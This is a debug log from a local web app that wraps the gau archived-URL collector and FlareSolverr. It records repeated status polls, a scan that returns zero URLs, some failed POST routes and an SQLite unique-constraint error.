2025-06-05 17:03:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:03:01] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:03:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:03:04] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:03:07 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:03:07] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:03:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:03:11] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:03:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:03:12] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 17:03:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:03:14] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:03:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:03:16] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:03:19 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:03:19] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:03:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:03:22] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:03:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:03:26] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:03:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:03:29] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:03:32 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:03:32] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:03:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:03:35] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:03:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:03:38] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:03:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:03:40] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 17:03:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:03:41] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:03:44 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:03:44] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:03:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:03:47] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:03:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:03:50] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:03:53 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:03:53] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:03:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:03:56] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:03:59 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:03:59] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:04:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:04:02] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:04:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:04:05] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:04:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:04:08] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:04:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:04:10] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 17:04:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:04:10] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:04:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:04:13] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:04:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:04:17] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:04:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:04:20] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:04:23 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:04:23] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:04:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:04:26] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:04:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:04:29] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:04:32 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:04:32] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:04:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:04:35] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:04:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:04:38] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:04:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:04:40] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 17:04:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:04:41] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:04:44 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:04:44] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:04:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:04:47] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:04:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:04:50] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:04:53 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:04:53] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:04:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:04:56] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:04:59 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:04:59] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:05:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:05:02] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:05:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:05:05] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:05:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:05:08] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:05:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:05:11] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:05:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:05:14] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:05:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:05:29] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:05:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:05:29] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 17:06:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:06:29] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:06:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:06:29] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 17:07:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:07:29] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:07:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:07:29] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 17:07:41 | INFO     | thread_gau.py:291 | _execute_gau_scan() | Gau扫描完成，正在处理结果...
2025-06-05 17:07:41 | INFO     | thread_gau.py:291 | _execute_gau_scan() | Gau扫描完成，正在处理结果...
2025-06-05 17:07:41 | INFO     | thread_gau.py:303 | _execute_gau_scan() | 输出文件大小: 0 字节
2025-06-05 17:07:41 | INFO     | thread_gau.py:303 | _execute_gau_scan() | 输出文件大小: 0 字节
2025-06-05 17:07:41 | INFO     | thread_gau.py:166 | _update_scan_result() | 已更新Gau扫描结果，目标ID: 1，当前URL总数: 0
2025-06-05 17:07:41 | INFO     | thread_gau.py:166 | _update_scan_result() | 已更新Gau扫描结果，目标ID: 1，当前URL总数: 0
2025-06-05 17:07:41 | INFO     | thread_gau.py:328 | _execute_gau_scan() | Gau扫描处理完成，目标ID: 1，总URL数: 0
2025-06-05 17:07:41 | INFO     | thread_gau.py:328 | _execute_gau_scan() | Gau扫描处理完成，目标ID: 1，总URL数: 0
2025-06-05 17:07:41 | INFO     | thread_gau.py:372 | _execute_gau_scan() | 已删除临时文件: /home/hacker/Desktop/C2/output/gau/gau_1_1749114178.txt
2025-06-05 17:07:41 | INFO     | thread_gau.py:372 | _execute_gau_scan() | 已删除临时文件: /home/hacker/Desktop/C2/output/gau/gau_1_1749114178.txt
2025-06-05 17:08:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:08:25] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 17:08:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:08:26] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:08:26 | INFO     | Gau_route.py:188 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-05 17:08:26 | INFO     | Gau_route.py:188 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-05 17:08:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:08:26] "GET /api/gau/history/1 HTTP/1.1" 200 -
2025-06-05 17:08:26 | INFO     | Gau_route.py:202 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-05 17:08:26 | INFO     | Gau_route.py:202 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-05 17:08:26 | INFO     | Gau_route.py:207 | gau_get_result() | DEBUG: scan_result found: True
2025-06-05 17:08:26 | INFO     | Gau_route.py:207 | gau_get_result() | DEBUG: scan_result found: True
2025-06-05 17:08:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:08:26] "GET /api/gau/result/1?page=1&per_page=50&category=all&search= HTTP/1.1" 200 -
2025-06-05 17:08:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:08:40] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 17:09:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:09:10] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 17:10:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:10:11] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 17:11:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:11:12] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 17:12:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:12:13] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 17:13:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:13:14] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 17:14:15 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:14:15] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 17:15:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:15:16] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 17:16:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:16:17] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 17:17:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:17:18] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 17:18:19 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:18:19] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 17:19:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:19:20] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 17:20:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:20:21] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 17:21:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:21:22] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 17:22:23 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:22:23] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 17:23:24 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:23:24] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 23:06:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:06:31] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 23:07:32 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:07:32] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 23:08:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:08:33] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 23:09:34 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:09:34] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 23:10:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:10:35] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 23:11:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:11:35] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 23:12:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:12:35] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 23:13:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:13:35] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 23:14:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:14:35] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 23:15:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:15:35] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 23:16:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:16:35] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 23:17:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:17:35] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 23:18:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:18:35] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 23:19:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:19:35] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 23:20:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:20:35] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 23:21:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:21:35] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 23:22:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:22:35] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 23:22:55 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:22:55] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 23:23:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:23:16] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 23:23:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:23:46] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 23:24:22 | INFO     | Gau_route.py:188 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-05 23:24:22 | INFO     | Gau_route.py:188 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-05 23:24:22 | INFO     | Gau_route.py:202 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=
2025-06-05 23:24:22 | INFO     | Gau_route.py:202 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=
2025-06-05 23:24:22 | INFO     | Gau_route.py:207 | gau_get_result() | DEBUG: scan_result found: True
2025-06-05 23:24:22 | INFO     | Gau_route.py:207 | gau_get_result() | DEBUG: scan_result found: True
2025-06-05 23:24:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:24:22] "GET /api/gau/result/1 HTTP/1.1" 200 -
2025-06-05 23:24:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:24:35] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 23:25:24 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:25:24] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 23:25:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:25:46] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 23:26:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:26:16] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 23:27:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:27:17] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 23:28:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:28:18] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 23:28:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:28:38] "GET /health HTTP/1.1" 200 -
2025-06-05 23:28:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:28:43] "[33mPOST /api/gau/scan HTTP/1.1[0m" 404 -
2025-06-05 23:28:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:28:48] "[33mPOST /api/gau/scan HTTP/1.1[0m" 404 -
2025-06-05 23:29:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:29:01] "[33mPOST /api/targets HTTP/1.1[0m" 404 -
2025-06-05 23:29:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:29:05] "[33mPOST /api/targets HTTP/1.1[0m" 404 -
2025-06-05 23:29:19 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:29:19] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 23:29:34 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:29:34] "[33mPOST /api/gau/scan/2 HTTP/1.1[0m" 404 -
2025-06-05 23:29:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:29:45] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 23:29:53 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:29:53] "GET /health HTTP/1.1" 200 -
2025-06-05 23:29:58 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:29:58] "[33mPOST /api/gau/scan/2 HTTP/1.1[0m" 404 -
2025-06-05 23:30:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:30:03] "[33mPOST /api/gau/scan/2 HTTP/1.1[0m" 404 -
2025-06-05 23:30:15 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:30:15] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 23:30:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:30:46] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 23:31:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:31:16] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 23:32:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:32:17] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 23:33:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:33:18] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 23:33:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:33:46] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 23:34:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:34:16] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 23:35:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:35:17] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 23:36:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:36:18] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 23:37:19 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:37:19] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 23:38:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:38:20] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 23:39:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:39:21] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 23:39:39 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:39:39] "GET /health HTTP/1.1" 200 -
2025-06-05 23:40:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:40:22] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 23:41:23 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:41:23] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 23:42:08 | INFO     | Gau_route.py:377 | gau_dashboard() | 正在載入 Gau 掃描器界面
2025-06-05 23:42:08 | INFO     | Gau_route.py:377 | gau_dashboard() | 正在載入 Gau 掃描器界面
2025-06-05 23:42:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:42:08] "GET /api/gau/dashboard?target_id=1 HTTP/1.1" 200 -
2025-06-05 23:42:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:42:08] "[36mGET /static/js/gau_dashboard.js HTTP/1.1[0m" 304 -
2025-06-05 23:42:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:42:08] "GET /api/gau/history/1 HTTP/1.1" 200 -
2025-06-05 23:42:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:42:08] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 23:42:08 | INFO     | Gau_route.py:188 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-05 23:42:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:42:08] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-05 23:42:08 | INFO     | Gau_route.py:188 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-05 23:42:08 | INFO     | Gau_route.py:202 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-05 23:42:08 | INFO     | Gau_route.py:202 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-05 23:42:08 | INFO     | Gau_route.py:207 | gau_get_result() | DEBUG: scan_result found: True
2025-06-05 23:42:08 | INFO     | Gau_route.py:207 | gau_get_result() | DEBUG: scan_result found: True
2025-06-05 23:42:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:42:08] "GET /api/gau/result/1?page=1&per_page=50&category=all&search= HTTP/1.1" 200 -
2025-06-05 23:42:12 | INFO     | Gau_route.py:377 | gau_dashboard() | 正在載入 Gau 掃描器界面
2025-06-05 23:42:12 | INFO     | Gau_route.py:377 | gau_dashboard() | 正在載入 Gau 掃描器界面
2025-06-05 23:42:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:42:12] "GET /api/gau/dashboard?target_id=1 HTTP/1.1" 200 -
2025-06-05 23:42:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:42:12] "[36mGET /static/js/gau_dashboard.js HTTP/1.1[0m" 304 -
2025-06-05 23:42:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:42:12] "GET /api/gau/history/1 HTTP/1.1" 200 -
2025-06-05 23:42:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:42:12] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 23:42:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:42:12] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-05 23:42:12 | INFO     | Gau_route.py:188 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-05 23:42:12 | INFO     | Gau_route.py:188 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-05 23:42:12 | INFO     | Gau_route.py:202 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-05 23:42:12 | INFO     | Gau_route.py:202 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-05 23:42:12 | INFO     | Gau_route.py:207 | gau_get_result() | DEBUG: scan_result found: True
2025-06-05 23:42:12 | INFO     | Gau_route.py:207 | gau_get_result() | DEBUG: scan_result found: True
2025-06-05 23:42:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:42:12] "GET /api/gau/result/1?page=1&per_page=50&category=all&search= HTTP/1.1" 200 -
2025-06-05 23:42:15 | INFO     | Gau_route.py:73 | gau_scan() | Scan parameters: threads=50, providers=wayback,commoncrawl,otx,urlscan, exclude_extensions=[], blacklist=ttf,woff,svg,png,jpg,gif,jpeg,ico
2025-06-05 23:42:15 | INFO     | Gau_route.py:73 | gau_scan() | Scan parameters: threads=50, providers=wayback,commoncrawl,otx,urlscan, exclude_extensions=[], blacklist=ttf,woff,svg,png,jpg,gif,jpeg,ico
2025-06-05 23:42:15 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 23:42:15 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 23:42:15 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 1/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
